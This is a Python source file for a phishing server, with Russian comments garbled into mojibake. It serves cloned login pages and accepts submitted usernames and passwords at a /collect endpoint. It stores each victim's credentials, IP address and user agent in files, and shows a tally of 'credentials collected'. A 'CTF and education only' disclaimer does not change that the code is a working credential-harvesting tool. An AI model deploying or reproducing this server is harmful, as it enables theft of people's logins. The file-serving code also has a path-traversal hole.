#!/usr/bin/env python3
"""
Phishing Server - –ü—Ä–æ—Å—Ç–æ–π HTTP —Å–µ—Ä–≤–µ—Ä –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö —Å —Ñ–∏—à–∏–Ω–≥–æ–≤—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
–¢–û–õ–¨–ö–û –î–õ–Ø CTF –ò –û–ë–†–ê–ó–û–í–ê–ù–ò–Ø!
"""

import http.server
import socketserver
import json
import os
import datetime
from urllib.parse import urlparse, parse_qs
from utils import *

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ HTTP –∑–∞–ø—Ä–æ—Å–æ–≤ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞"""
    
    def do_POST(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ POST –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –¥–∞–Ω–Ω—ã–º–∏"""
        if self.path == '/collect':
            self.handle_data_collection()
        else:
            self.send_error(404)
    
    def handle_data_collection(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö"""
        try:
            # –ü–æ–ª—É—á–∞–µ–º –¥–ª–∏–Ω—É –∫–æ–Ω—Ç–µ–Ω—Ç–∞
            content_length = int(self.headers['Content-Length'])
            
            # –ß–∏—Ç–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            post_data = self.rfile.read(content_length)
            
            # –ü–∞—Ä—Å–∏–º JSON
            data = json.loads(post_data.decode('utf-8'))
            
            # –î–æ–±–∞–≤–ª—è–µ–º –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ
            data['server_timestamp'] = datetime.now().isoformat()
            data['client_ip'] = self.client_address[0]
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
            self.save_credentials(data)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {'status': 'success', 'message': 'Data collected'}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
            print_success(f"–î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã –æ—Ç {data.get('username', 'Unknown')}")
            
        except Exception as e:
            print_error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö: {e}")
            self.send_error(500)
    
    def save_credentials(self, data):
        """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–∞–π–ª"""
        try:
            # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è –¥–∞–Ω–Ω—ã—Ö
            data_dir = "phishing_data"
            if not os.path.exists(data_dir):
                os.makedirs(data_dir)
            
            # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∏–º—è —Ñ–∞–π–ª–∞
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            username = data.get('username', 'unknown').replace('/', '_').replace('\\', '_')
            filename = f"{data_dir}/credentials_{username}_{timestamp}.json"
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            print_success(f"–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã: {filename}")
            
            # –¢–∞–∫–∂–µ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –æ–±—â–∏–π –ª–æ–≥
            log_file = f"{data_dir}/all_credentials.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{data['server_timestamp']}] {data.get('username', 'Unknown')} - {data.get('target', 'Unknown')}\n")
            
        except Exception as e:
            print_error(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: {e}")
    
    def do_GET(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ GET –∑–∞–ø—Ä–æ—Å–æ–≤"""
        if self.path == '/':
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            self.show_data_summary()
        elif self.path.startswith('/phishing_') or self._is_domain_path():
            # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
            self.serve_phishing_page()
        else:
            # –û–±—ã—á–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–∞–π–ª–æ–≤
            super().do_GET()
    
    def _is_domain_path(self):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø—É—Ç—å –¥–æ–º–µ–Ω–Ω—ã–º (–Ω–∞–ø—Ä–∏–º–µ—Ä /example.com/)"""
        path_parts = self.path.strip('/').split('/')
        if len(path_parts) >= 1 and path_parts[0]:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –ø–∞–ø–∫–∞ —Å —Ç–∞–∫–∏–º –¥–æ–º–µ–Ω–æ–º
            domain = path_parts[0]
            phishing_dirs = [d for d in os.listdir('.') if d.startswith('phishing_')]
            for phishing_dir in phishing_dirs:
                if domain in phishing_dir:
                    return True
        return False
    
    def serve_phishing_page(self):
        """–û–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–µ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü"""
        try:
            # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø—É—Ç—å –∫ —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ
            path_parts = self.path.strip('/').split('/')
            if len(path_parts) >= 1 and path_parts[0]:
                domain = path_parts[0]
                
                # –ò—â–µ–º —Ñ–∏—à–∏–Ω–≥–æ–≤—É—é –ø–∞–ø–∫—É –ø–æ –¥–æ–º–µ–Ω—É
                phishing_dirs = [d for d in os.listdir('.') if d.startswith('phishing_')]
                
                target_dir = None
                for phishing_dir in phishing_dirs:
                    if domain in phishing_dir:
                        target_dir = phishing_dir
                        break
                
                if target_dir:
                    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–∞–∫–æ–π —Ñ–∞–π–ª –æ—Ç–¥–∞–≤–∞—Ç—å
                    if len(path_parts) == 1 or path_parts[1] == '':
                        # –ö–æ—Ä–Ω–µ–≤–æ–π –ø—É—Ç—å - –æ—Ç–¥–∞–µ–º phishing.html
                        file_path = os.path.join(target_dir, 'phishing.html')
                    else:
                        # –ü–æ–¥–ø—É—Ç—å - –æ—Ç–¥–∞–µ–º —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª
                        sub_path = '/'.join(path_parts[1:])
                        file_path = os.path.join(target_dir, sub_path)
                    
                    if os.path.exists(file_path):
                        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º MIME —Ç–∏–ø
                        if file_path.endswith('.html'):
                            content_type = 'text/html'
                        elif file_path.endswith('.css'):
                            content_type = 'text/css'
                        elif file_path.endswith('.js'):
                            content_type = 'application/javascript'
                        elif file_path.endswith('.png'):
                            content_type = 'image/png'
                        elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                            content_type = 'image/jpeg'
                        else:
                            content_type = 'text/plain'
                        
                        # –ß–∏—Ç–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª
                        with open(file_path, 'rb') as f:
                            content = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-type', content_type)
                        self.end_headers()
                        self.wfile.write(content)
                        return
                
                # –ï—Å–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ —Ñ–∏—à–∏–Ω–≥–æ–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º 404
                self.send_error(404)
            else:
                self.send_error(404)
                
        except Exception as e:
            print_error(f"–û—à–∏–±–∫–∞ –æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏—è —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã: {e}")
            self.send_error(500)
    
    def show_data_summary(self):
        """–ü–æ–∫–∞–∑ —Å–≤–æ–¥–∫–∏ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
        try:
            data_dir = "phishing_data"
            if not os.path.exists(data_dir):
                os.makedirs(data_dir)
            
            # –°—á–∏—Ç–∞–µ–º —Ñ–∞–π–ª—ã
            json_files = []
            if os.path.exists(data_dir):
                json_files = [f for f in os.listdir(data_dir) if f.endswith('.json')]
            
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Data Collection - CTF Demo</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }}
        .header {{ background: #dc3545; color: white; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .stats {{ background: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .file-list {{ background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; border-radius: 4px; }}
        .file-item {{ margin: 5px 0; padding: 5px; background: white; border-radius: 3px; }}
        .ctf-notice {{ color: #6c757d; font-size: 12px; text-align: center; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîç Phishing Data Collection</h1>
        </div>
        
        <div class="warning">
            <strong>‚ö†Ô∏è CTF DEMO SERVER</strong><br>
            This server is for educational purposes only. All data collection is simulated for CTF scenarios.
        </div>
        
        <div class="stats">
            <h3>üìä Statistics</h3>
            <p><strong>Total credentials collected:</strong> {len(json_files)}</p>
            <p><strong>Server running since:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="file-list">
            <h3>üìÅ Collected Data Files</h3>
            {"".join([f'<div class="file-item">üìÑ {file}</div>' for file in json_files]) if json_files else '<div class="file-item">No data collected yet</div>'}
        </div>
        
        <div class="ctf-notice">
            CTF DEMO - Phishing Data Collection Server
        </div>
    </div>
</body>
</html>
"""
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
            
        except Exception as e:
            print_error(f"–û—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö: {e}")
            self.send_error(500)

def start_phishing_server(port=8080):
    """–ó–∞–ø—É—Å–∫ —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞"""
    print_warning("‚ö†Ô∏è  –§–ò–®–ò–ù–ì–û–í–´–ô –°–ï–†–í–ï–† - –¢–û–õ–¨–ö–û –î–õ–Ø CTF –ò –û–ë–†–ê–ó–û–í–ê–ù–ò–Ø!")
    print_warning("‚ö†Ô∏è  –ù–ï –ò–°–ü–û–õ–¨–ó–£–ô–¢–ï –î–õ–Ø –ù–ï–ó–ê–ö–û–ù–ù–´–• –¶–ï–õ–ï–ô!")
    print()
    
    try:
        with socketserver.TCPServer(("", port), PhishingHandler) as httpd:
            print_success(f"–§–∏—à–∏–Ω–≥–æ–≤—ã–π —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É {port}")
            print_info(f"–î–æ—Å—Ç—É–ø–µ–Ω –ø–æ –∞–¥—Ä–µ—Å—É: http://localhost:{port}")
            print_info("–î–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞–∂–º–∏—Ç–µ Ctrl+C")
            print()
            
            # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è –¥–∞–Ω–Ω—ã—Ö
            data_dir = "phishing_data"
            if not os.path.exists(data_dir):
                os.makedirs(data_dir)
                print_success(f"–°–æ–∑–¥–∞–Ω–∞ –ø–∞–ø–∫–∞ –¥–ª—è –¥–∞–Ω–Ω—ã—Ö: {data_dir}")
            
            httpd.serve_forever()
            
    except KeyboardInterrupt:
        print_success("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
    except Exception as e:
        print_error(f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Phishing Server - –¢–û–õ–¨–ö–û –î–õ–Ø CTF!')
    parser.add_argument('--port', type=int, default=8080, help='–ü–æ—Ä—Ç –¥–ª—è —Å–µ—Ä–≤–µ—Ä–∞')
    
    args = parser.parse_args()
    
    start_phishing_server(args.port)

if __name__ == "__main__":
    main()
